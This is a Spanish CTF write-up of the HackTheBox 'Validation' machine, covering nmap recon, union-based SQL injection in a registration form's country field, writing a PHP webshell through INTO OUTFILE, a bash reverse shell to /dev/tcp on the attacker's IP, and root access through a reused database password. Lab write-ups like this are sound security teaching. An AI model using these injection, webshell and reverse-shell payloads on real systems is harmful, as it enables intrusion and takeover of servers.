---
title: Validation Writeup
author: xdann1
date: 2022-06-01
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, SQLi, Burpsuite, Credenciales]
image:
  path: ../../assets/img/commons/validation/validation.png
  width: 800
  height: 500
  alt: Banner Validation
---

Máquina Easy, en la que encontramos un SQLi, gracias a esto conseguimos escribir una webshell en el servidor consiguiendo un RCE, por último, encontramos unas credenciales en un archivo de configuración que sirven para el usuario root. 

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.129.97.4
PING 10.129.97.4 (10.129.97.4) 56(84) bytes of data.
64 bytes from 10.129.97.4: icmp_seq=1 ttl=63 time=31.0 ms

--- 10.129.97.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 31.015/31.015/31.015/0.000 ms
```

En la salida del comando anterior se puede ver un parámetro llamado `ttl`, gracias a este parámetro podemos saber que sistema operativo está corriendo en la máquina víctima.

* GNU/Linux = TTL 64
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos están abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.97.4 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.129.97.4 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 01:30 CEST
Scanning 10.129.97.4 [65535 ports]
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 62
4566/tcp open  kwtc       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p22,80,4566,8080 -sC -sV 10.129.97.4 -oN targeted
```

* -p22,80,4566,8080 > Indica los puertos que se quieren escanear
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.129.97.4 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del escaneo:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-01 01:33 CEST
Nmap scan report for 10.129.97.4
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http
* 4566/tcp > http
* 8080/tcp > http

Empezaremos enumerando las tecnologías que está utilizando la página. Esto lo podemos hacer utilizando un plugin del navegador llamadado `Wappalyzer` o utilizando la herramienta `whatweb`. Al ser varios servicios http vamos a usar un one-liner para evaluarlos de una vez.

```bash
❯ for port in $(cat targeted | grep http | grep -oP '\d{1,5}/tcp' | cut -d "/" -f 1 ); do echo "\n[*] Puerto $port:"; whatweb http://10.129.97.4:$port; done
```

```plaintext

[*] Puerto 80:
http://10.129.97.4:80 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.129.97.4], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]

[*] Puerto 4566:
http://10.129.97.4:4566 [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.97.4], Title[403 Forbidden], nginx

[*] Puerto 8080:
http://10.129.97.4:8080 [502 Bad Gateway] Country[RESERVED][ZZ], HTTPServer[nginx], IP[10.129.97.4], Title[502 Bad Gateway], nginx
```

El nginx del puerto 4566 nos da un código de estado 403 y el nginx del puerto 8080 nos da un código de estado 502, por lo que solamente vamos a poder interactuar con el sevicio web del puerto 80. 

Ahora podríamos intentar hacer un reconocimiento de rutas con `dirsearch`, Utilizaremos fuerza bruta para enumerar rutas potenciales.

```plaintext
❯ dirsearch -u http://10.129.97.4/ -x 403
```

* -u http://10.129.97.4/ > Indica la url a la que se le van a hacer las peticiones
* -x 403 > Oculta las peticiones con un código de estado

Las rutas que hemos hallado son los siguientes:

```plaintext
Target: http://10.129.97.4/

[01:59:09] Starting: 
[01:59:10] 301 -  307B  - /js  ->  http://10.129.97.4/js/
[01:59:20] 200 -   16B  - /account.php
[01:59:33] 200 -    0B  - /config.php
[01:59:35] 301 -  308B  - /css  ->  http://10.129.97.4/css/
[01:59:41] 200 -   16KB - /index.php
[01:59:41] 200 -   16KB - /index.php/login/
```

No tenemos nada demasiado interesante de momento. 

# Busqueda de vulnerabilidades

Vamos a ver como es la web.

![Página Web]({{ 'assets/img/commons/validation/web.png' | relative_url }}){: .center-image }
_Página Web_

Parece ser que podemos entrar usando un nombre y un país. Vamos a probar si el campo del nombre es vulnerable.

![XSS]({{ 'assets/img/commons/validation/xss_1.png' | relative_url }}){: .center-image }
_XSS_

![XSS]({{ 'assets/img/commons/validation/xss_2.png' | relative_url }}){: .center-image }
_XSS_

Vemos que es el vulnerable a un XSS, sin embargo, esto no nos es útil ya que no tenemos a quién robarle la cookie para luego iniciar sesión. Probemos una inyección SQL.

![Prueba SQLi]({{ 'assets/img/commons/validation/sql_2.png' | relative_url }}){: .center-image }
_Prueba SQLi_

![Prueba SQLi]({{ 'assets/img/commons/validation/sql_2.png' | relative_url }}){: .center-image }
_Prueba SQLi_

Vemos que no estamos provocando ningun error en la query SQL por lo que deducimos que no es vulnerable a una inyección SQL. Pero solamente la hemos probado en el campo del nombre,  por lo que aún nos falta probarla en el campo del país, para ello utilizaremos `burpsuite`

Vamos a capturar la petición de tipo POST que enviamos al entrar usando un usario y el país, posteriormente la vamos a enviar al repeater para poder jugar con ella.


![Burpsuite]({{ 'assets/img/commons/validation/burpsuite_1.png' | relative_url }}){: .center-image }
_Interceptando la petición_

Ahora, con la petición ya en el repeater intentemos comprobar si podemos conseguir una inyección SQL en el campo del país colocando una comilla simple.

![SQLi]({{ 'assets/img/commons/validation/burpsuite_2.png' | relative_url }}){: .center-image }
_Comprobando inyección SQL_

Como sospechabamos, tenemos una inyección SQL en el campo del país.

# Explotación

Más o menos podemos llegar a intuir como es la query que se manda, tiene que tener un aspecto parecido al siguiente.

```plaintext
SELECT username from uhc where country = ['input usuario']; 
```

Como hemos visto antes el campo del país es vulnerable a una inyección SQL, usaremos un tipo inyección SQL llamada `Union Based` la query maliciosa quedaría así:

```plaintext
 SELECT username from uhc where country = 'Brazil' UNION SELECT 1-- -';
```

Las inyecciones SQL de tipo `Union Based` nos permiten crear una consulta dentro de la consulta principal, agregando los resultados de la nuestra a la principal. Para ello necesitaremos poner el mismo número de campos en la consulta UNION como tenga la tabla, si no hacemos esto la consulta nos generará un error.

Para conseguirlo utilizaremos la orden `order by` seguido del número de campos que queramos probar, lo que tendremos que hacer es ir variando el número hasta encontrar cual no nos da error y que el siguente si nos lo de.

```plaintext
username=xdann1&country=Brazil' ORDER BY 1-- -
```

Vemos que la tabla cuenta solo con un campo, sabiendo esto ya nos podemos poner manos a la obra. Lo primero que haremos será sacar el nombre de la base de datos, la versión y el usuario que está corriendola. Como solo tenemos un campo con el que operar tendremos que recurrir a concatenar con la orden concat. (0x20 significa el caracter espacio en hexadecimal)

```plaintext
username=xdann1&country=Brazil' UNION SELECT CONCAT(user(),0x20,database(),0x20,@@version)-- -
```

* Usuario > uhc@localhost
* Base de datos > registration 
* Versión > 10.5.11-MariaDB-1

Empezemos buscando que bases de datos existen.

```plaintext
username=xdann1&country=Brazil' UNION SELECT schema_name FROM information_schema.schemata-- -
```

* Bases de datos existentes > information_schema, performance_schema, mysql y registration 

Ahora vamos a sacar las tablas existentes en la base de datos registration.

```plaintext
username=xdann1&country=Brazil' UNION SELECT table_name FROM information_schema.tables where table_schema="registration"-- -
```

* Tablas existentes en la base de datos registration > registration

Saquemos las columnas de la tabla registration.

```plaintext
username=xdann1&country=Brazil' UNION SELECT column_name FROM information_schema.columns WHERE table_schema="registration" AND table_name="registration"-- -
```

* Columnas de la tabla registration > username, userhash, country y regtime

Vamos a sacar toda la información contenida de las columnas username y userhash.

```plaintext
username=xdann1&country=Brazil' UNION SELECT CONCAT(username,0x3a,userhash) FROM registration.registration-- -
```

```plaintext
xdann1:c2b5b685495dbbf7ea7d9539d8150f7b
xdann1':aed18eeb555ae4135a0fab179b34a001
```

Hemos obtenido los nombres y los hashes de los usuarios, pero no de otros usuarios, sino de los nuestros. Cosas que pasan... Aun así podemos probar otras cosas, por ejemplo, podemos intentar ver si el usuario que está corriendo la base de datos tiene permisos de escritura, si fuera así podríamos subir una web shell que nos de acceso a la máquina víctima.

Para poder escribir archivos del lado del servidor necesitamos tres cosas:

1. Usuario con privilegio `FILE` habilitado
2. Variable `secure_file_priv` no habilitada
3. Acceso de escritura en la ubicación en la que queramos escribir.

Vamos a comprobar que privilegios tiene otorgado nuestro usuario.

```plaintext
username=xdann1&country=Brazil' UNION SELECT CONCAT(grantee,0x3a,privilege_type) FROM information_schema.user_privileges WHERE grantee="'uhc'@'localhost'" AND privilege_type="FILE"-- -
```

* 'uhc'@'localhost':FILE

Ya sabemos que contamos con los privilegios necesarios, ahora vamos a ver si la variable `secure_file_priv` está activada. Esta variable se utiliza para determinar desde donde podemos leer/escribir archivos. Un valor vacío en esta variable nos indica que podemos leer/escribir en todo el sistema de archivos. MariaDB trae esta variable con un valor vacío por defecto, igualmente vamos a revisar su valor.

```plaintext
username=xdann1&country=Brazil' UNION SELECT CONCAT(variable_name,0x3a,variable_value) FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

* secure_file_priv:""

Ya hemos comprobado que cumplimos con todos los requisitos para poder escribir archivos del lado del servidor. Suponiendo que la web se esté alojando en la ruta del sistema `/var/www/html` subiremos en esa ruta la web shell.

```plaintext
username=xdann1&country=Brazil' UNION SELECT "<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE "/var/www/html/WebShell.php"-- -
```

![Web shell]({{ 'assets/img/commons/validation/webshell.png' | relative_url }}){: .center-image }
_Web shell_

Vamos a mandarnos una reverse shell hacia nuestro equipo para trabajar más comodamente. Lo primero de todo, es ponernos en escucha con `netcat`.

```plaintext
❯ nc -nlvp 443
listening on [any] 443 ...
```

Ya estando en escucha introducimos el siguiente comando en la web shell, es IMPORTANTE que lo introduzcamos codificado en url. Podemos utilizar páginas web como [esta](https://www.urlencoder.org/) o herramientas como `urlencode`.

```plaintext
bash -c "bash -i >& /dev/tcp/10.10.14.16/443 0>&1"
```

Ya hemos establecido la reverse shell, ahora vamos a tratarla para hacerla completamente funcional.

```plaintext
❯ nc -nlvp 443
listening on [any] 443 ...
Connection from 10.129.97.4:53268
❯ script /dev/null -c bash
Script started, file is /dev/null
❯ CTRL + Z
[1]+ Detenido		nc -nlvp 443
❯ stty raw -echo; fg
nc -nlvp 443
	reset
reset: unknow terminal type unknown
Terminal type? xterm
❯ export SHELL=bash
❯ export TERM=xterm
❯ stty rows 42 columns 174
```

# Post-explotación

Lo primero, vamos a leer la flag del usuario.

```plaintext
❯ cat user.txt 
64f93146bf458bb8****************
```

Vemos varios archivos en el directorio en el que se aloja la web, uno de ellos nos llama especialmente la atención, el archivo `config.php`. Lo leemos y encontramos unas credenciales que parecen ser del usuario `uhc`.

```plaintext
❯ cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Vamos a intentar convertirnos en el usuario `uhc`.

```plaintext
❯ su uhc
su: user uhc does not exist or the user entry does not contain all the required fields
```

Nos dice que el usuario `uhc` no existe, vamos a comprobarlo nosotros mismos.

```plaintext
❯ cat /etc/passwd | grep uhc
```

No nos da ningun output por lo que corroboramos que no existe el usuario `uhc`, intentemos probar la contraseña encontrada con el usuaro `root`.

```plaintext
❯ su root                   
Password: 
❯ whoami
root
❯ cat /root/root.txt 
79e15433aa1884bb****************
```
